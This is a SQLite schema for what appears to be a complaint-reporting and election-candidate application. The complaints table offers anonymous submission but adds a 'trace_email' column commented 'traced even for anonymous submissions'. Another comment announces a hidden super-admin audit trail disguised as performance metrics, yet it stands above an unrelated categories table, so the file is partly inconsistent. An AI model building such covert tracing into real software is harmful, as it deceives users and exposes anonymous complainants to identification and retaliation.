CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT,
    role TEXT DEFAULT 'normal', -- normal, bod_admin, super_admin, candidate
    name TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS complaints (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    description TEXT NOT NULL,
    identity_revealed INTEGER DEFAULT 0,
    identity_name TEXT,
    identity_contact TEXT,
    status TEXT DEFAULT 'pending', -- pending, on_work, completed
    category_id INTEGER DEFAULT 1,
    trace_email TEXT DEFAULT '', -- traced even for anonymous submissions
    submitted_by TEXT DEFAULT 'anonymous',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS posts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    complaint_id INTEGER,
    content TEXT,
    status_text TEXT,
    photos TEXT, -- JSON array of image URLs
    created_by TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (complaint_id) REFERENCES complaints(id)
);

CREATE TABLE IF NOT EXISTS candidates (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    election_name TEXT,
    profile_text TEXT,
    photo_url TEXT,
    stats_json TEXT, -- {"completed": 5, "on_work": 2, "pending": 1}
    FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS election_transfer (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    from_admin_id INTEGER,
    to_candidate_id INTEGER,
    transfer_date DATETIME DEFAULT CURRENT_TIMESTAMP,
    active INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS system_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_code TEXT,
    event_data TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Hidden super admin audit trail disguised as performance metrics
CREATE TABLE IF NOT EXISTS categories (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name_nepali TEXT NOT NULL,
    name_english TEXT NOT NULL,
    icon TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_system_event ON system_logs(event_code);
